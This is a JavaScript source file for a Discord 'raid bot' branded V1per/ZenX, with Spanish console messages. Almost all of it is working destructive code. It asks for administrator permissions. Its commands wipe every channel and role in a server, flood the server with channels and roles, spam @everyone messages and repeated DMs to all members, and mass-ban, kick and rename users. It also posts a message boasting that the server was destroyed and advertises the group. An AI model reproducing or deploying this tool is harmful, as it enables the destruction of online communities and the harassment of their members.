const { Client, EmbedBuilder} = require('discord.js');
const client = new Client({intents: [103423]});
const fetch = require('node-fetch');
const chalk = require(`chalk`);
const bot_token = ""; //Token de tu bot
const prefix = ".";
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
console.clear();
client.on(`ready`,()=>{
console.log(`${chalk.magentaBright(`
        
                                    /$$                                
                                   /$$$$                                
                       /$$    /$$ |_  $$    /$$$$$$   /$$$$$$   /$$$$$$ 
                      |  $$  /$$/   | $$   /$$__  $$ /$$__  $$ /$$__  $$
                       \\  $$/$$/    | $$  | $$  \\ $$| $$$$$$$$| $$  \\__/
                        \\  $$$/     | $$  | $$  | $$| $$_____/| $$      
                         \\  $/     /$$$$$$| $$$$$$$/|  $$$$$$$| $$      
                          \\_/     |______/| $$____/  \\_______/|__/      
                                          | $$                          
                                          | $$                          
                                          |__/                          
    
                                    ${chalk.white(`Discord Raid Bot`)}

            ${prefix}nuke,  ${prefix}spam,  ${prefix}cdel,  ${prefix}rdel,  ${prefix}ccr,  ${prefix}vccr,  ${prefix}ctcr,  ${prefix}rcr,  
                ${prefix}rename,  ${prefix}changeicon,  ${prefix}massban,  ${prefix}kickall,  ${prefix}msgall,  ${prefix}nickall

                            ${chalk.white(`for detailed information use ${prefix}help`)}



    [i] Version V1per: ${chalk.white(`PREMIUM || $ ZenX Replica`)}
    [i] Usuario del bot: ${chalk.white(client.user.username)}
    [i] Invitación del bot: ${chalk.white(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`)}
`)}`);
});
client.on(`messageCreate`,async (msg)=>{
    const args = msg.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    if(msg.content === prefix+"help"){
        await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setImage(`https://media1.tenor.com/m/BArpwLfY1GUAAAAC/moon-aesthetic.gif`)
            .setTitle(`:satellite: V1per commands:`)
            .setDescription(`**Free commands:**\n\n\`${prefix}nuke\` - Delete Channels, Roles, Channels and Create Roles\n\`${prefix}spam <amount>\` - Spam in all channels\n\n**Premium commands:**\n\`${prefix}cdel\` - Delete all Channels\n\`${prefix}rdel\` - Delete all Roles\n\`${prefix}ccr <amount>\` - Create Channels\n\`${prefix}vccr <amount>\` - Create Voice Channels\n\`${prefix}ctcr <amount>\` - Create Cattegories\n\`${prefix}rcr <amount>\` - Create Roles\n\`${prefix}rename <name>\` - Change Guild Name\n\`${prefix}changeicon <icon_url>\` - Change Guild Icon\n\`${prefix}massban\` - Ban all members\n\`${prefix}kickall\` - Kick all members\n\`${prefix}msgall\` - Send spam dm to all members\n\`${prefix}nickall\` - Change nickname for all members\n\n\nBuy premium bot in:\n- Bro esta es la versión premium XD\n- [Si quieres más, únete a ZenX dando clic aquí e.e](https://discord.gg/zCQ8jQ2GBf)`)
        ]})
    };
    if(msg.content === prefix+"nuke"){
        const channelss = await msg.guild.channels.fetch();
        for (const ch of channelss.values()) {
            try {
                ch.delete();
            } catch (e) {
                console.log(e.message);
            };
        };
        const roless = await msg.guild.roles.fetch();
        for (const rl of roless.values()) {
            try {
                await rl.delete();
                console.log(chalk.magentaBright(`[$] Se borró el rol ${chalk.white(rl.name)} .`));
            } catch (e) {
                console.log(e.message);
                console.log(chalk.red(`[x] No se pudo borrar el rol ${chalk.white(rl.name)} .`));
            };
        };
        async function create_txt_channel() {
            await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                method:'POST',
                headers: {
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    name:"zenx-on-top",
                    type:0,
                    topic:"ZenX On Top"
                })
            });
        };
        for (let index = 0; index < 50; index++) {
            await wait_ms(25);
            create_txt_channel();
        };
        for (let index = 0; index < 20; index++) {
            try {
                for (let index = 0; index < 20; index++) {
                    await msg.guild.roles.create({name:`ZenX On Top`, reason:`ZenX On Top`});
                };
            } catch (e) {
                console.log(chalk.red(`[x] No se pudo crear un rol.`));
                console.log(e.message);
            }
        };
    };
    if(command === "spam"){
        const monto_mensajes = args[0];
        async function mass_ping(canalid) {
            const canalxd = client.channels.cache.get(canalid);
            for (let index = 0; index < monto_mensajes; index++) {
                try {
                    canalxd.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`, embeds:[
                        new EmbedBuilder()
                            .setImage(`https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=654f7210&is=653cfd10&hm=53ed05fda49076f74d6a4be979cb4a89f4928a09193f1d19d53f2d2918c5f2fe&`)
                            .setTitle(`⸸                Servidor destruido por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                            .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=zk9NAM2plQY)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=GJR0eE2Rzn8&t)**\n\n-------------------------  Ж  -------------------------`)
                    ]});
                } catch (e) {
                    console.log(e.message);
                }
            };
        };
        const channelss = await msg.guild.channels.fetch();
        for (const ch of channelss.values()) {
            mass_ping(ch.id);
        };
    };
    if(msg.content === prefix+"cdel"){
        const channelss = await msg.guild.channels.fetch();
        for (const ch of channelss.values()) {
            try {
                ch.delete();
            } catch (e) {
                console.log(e.message);
            };
        };
    };
    if(msg.content === prefix+"rdel"){
        const roless = await msg.guild.roles.fetch();
        for (const rl of roless.values()) {
            try {
                await rl.delete();
                console.log(chalk.magentaBright(`[$] Se borró el rol ${chalk.white(rl.name)} .`));
            } catch (e) {
                console.log(e.message);
                console.log(chalk.red(`[x] No se pudo borrar el rol ${chalk.white(rl.name)} .`));
            };
        };
    };
    if(command === "ccr"){
        const monto_canales = args[0];
        async function create_txt_channel() {
            await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                method:'POST',
                headers: {
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    name:"zenx-on-top",
                    type:0,
                    topic:"https://discord.gg/zCQ8jQ2GBf"
                })
            });
        };
        for (let index = 0; index < monto_canales; index++) {
            await wait_ms(25);
            create_txt_channel();
        };
    };
    if(command === "vccr"){
        const monto_canales = args[0];
        async function create_voice_channel() {
            await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                method:'POST',
                headers: {
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    name:"zenx-on-top",
                    type:2
                })
            });
        };
        for (let index = 0; index < monto_canales; index++) {
            await wait_ms(50);
            create_voice_channel();
        };
    };
    if(command === "ctcr"){
        const monto_canales = args[0];
        async function create_cattegory_channel() {
            await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                method:'POST',
                headers: {
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    name:"zenx-on-top",
                    type:4,
                })
            });
        };
        for (let index = 0; index < monto_canales; index++) {
            await wait_ms(50);
            create_cattegory_channel();
        };
    };
    if(command === "rcr"){
        const monto_roles = args[0];
        for (let index = 0; index < monto_roles; index++) {
            try {
                await msg.guild.roles.create({name:`ZenX On Top`, reason:`ZenX On Top`});
            } catch (e) {
                console.log(chalk.red(`[x] No se pudo crear un rol.`));
                console.log(e.message);
            };
        };
    };
    if(msg.content === "count"){
        let chanansd = await msg.guild.channels.fetch();
        msg.channel.send({content:`Hay ${chanansd.size} canales`})
    }
    if(command === "rename"){
        const newname = args.slice(0).join(' ');
        try {
            await msg.guild.setName(newname);
            console.log(chalk.magentaBright(`[$] Se cambió el nombre del servidor.`));
        } catch (e) {
            console.log(chalk.red(`[x] No se pudo cambiar el nombre al servidor.`));
            console.log(e.message);
        };
    };
    if(command === "changeicon"){
        const icono = args[0];
        try {
            await msg.guild.setIcon(icono);
            console.log(chalk.magentaBright(`[$] Se cambió el ícono del servidor.`));
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix+"massban"){
        const memberss = await msg.guild.members.fetch();
        for (const mb of memberss.values()) {
            try {
                await mb.ban();
                console.log(chalk.magentaBright(`[$] Se baneó al usuario ${chalk.white(mb.user.username)} .`));
            } catch (e) {
                console.log(chalk.red(`[x] No se pudo banear al usuario ${chalk.white(mb.user.username)} .`));
                console.log(e.message);
            };
        };
    };
    if(msg.content === prefix+"kickall"){
        const memberss = await msg.guild.members.fetch();
        for (const mb of memberss.values()) {
            try {
                await mb.kick();
                console.log(chalk.magentaBright(`[$] Se kickeó al usuario ${chalk.white(mb.user.username)} .`));
            } catch (e) {
                console.log(chalk.red(`[x] No se pudo kickear al usuario ${chalk.white(mb.user.username)} .`));
                console.log(e.message);
            };
        };
    };
    if(msg.content === prefix+"msgall"){
        async function mass_dm(userid) {
            const usuarioxd = msg.guild.members.cache.get(userid);
            for (let index = 0; index < 10; index++) {
                try {
                    await usuarioxd.send({content:`> <@${userid}> ZenX On Top bro...\n> [ ** https://discord.gg/zCQ8jQ2GBf ** ]`});
                } catch (e) {
                    console.log(e.message);
                };
            };
        };
        const memberss = await msg.guild.members.fetch();
        for (const mb of memberss.values()) {
            try {
                mass_dm(mb.user.id);
            } catch (e) {
                console.log(e.message);
            };
        };
    };
    if(msg.content === prefix+"nickall"){
        const memberss = await msg.guild.members.fetch();
        for (const mb of memberss.values()) {
            try {
                await mb.setNickname(`ZenX-On-Top`);
                console.log(chalk.magentaBright(`[$] Se renombró al usuario ${chalk.white(mb.user.username)} .`));
            } catch (e) {
                console.log(chalk.red(`[x] No se pudo renombrar al usuario ${chalk.white(mb.user.username)} .`));
                console.log(e.message);
            };
        };
    };
});
client.login(bot_token);